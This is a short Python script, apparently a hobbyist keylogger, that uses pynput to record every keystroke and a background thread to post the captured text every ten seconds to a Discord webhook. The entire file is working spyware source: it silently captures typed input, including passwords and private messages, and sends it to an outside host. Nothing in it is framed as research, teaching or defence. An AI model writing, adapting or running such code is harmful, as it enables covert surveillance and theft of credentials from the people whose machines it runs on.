import threading
import requests
import time
from pynput import keyboard

# Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'YOUR_WEBHOOK_URL'
INTERVAL = 10  # Time interval in seconds

text_buffer = []

IGNORED_KEYS = {keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
                keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                keyboard.Key.enter}

def send_to_discord(message):
    data = {"content": message}
    response = requests.post(WEBHOOK_URL, json=data)
    if response.status_code == 204:
        print("Message successfully sent to Discord!")
    else:
        print(f"Failed to send message to Discord: {response.status_code}")

def process_text():
    while True:
        if text_buffer:
            message = "".join(text_buffer)
            send_to_discord(message)
            text_buffer.clear()
        time.sleep(INTERVAL)

def on_press(key):
    if key in IGNORED_KEYS:
        return
    if key == keyboard.Key.space:
        key_data = " "
    elif key == keyboard.Key.backspace:
        remove_last_word()
        return
    else:
        try:
            key_data = key.char
        except AttributeError:
            key_data = f"[{key}]"
    print(key_data)
    text_buffer.append(key_data)

def remove_last_word():
    global text_buffer
    if text_buffer:
        text_str = "".join(text_buffer).rstrip()
        text_buffer = list(" ".join(text_str.split()[:-1]))
    print(f"Text after backspace: {''.join(text_buffer)}")

# This slows down the pc 
# Thsi sis also a maessage again sent to the discord server

def on_release(key):
    print(f"Key released: {key}")
    if key == keyboard.Key.esc:
        # Stop listener
        return False 
# , on_release=on_release

# Start the thread that processes the text buffer at intervals
threading.Thread(target=process_text, daemon=True).start()

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

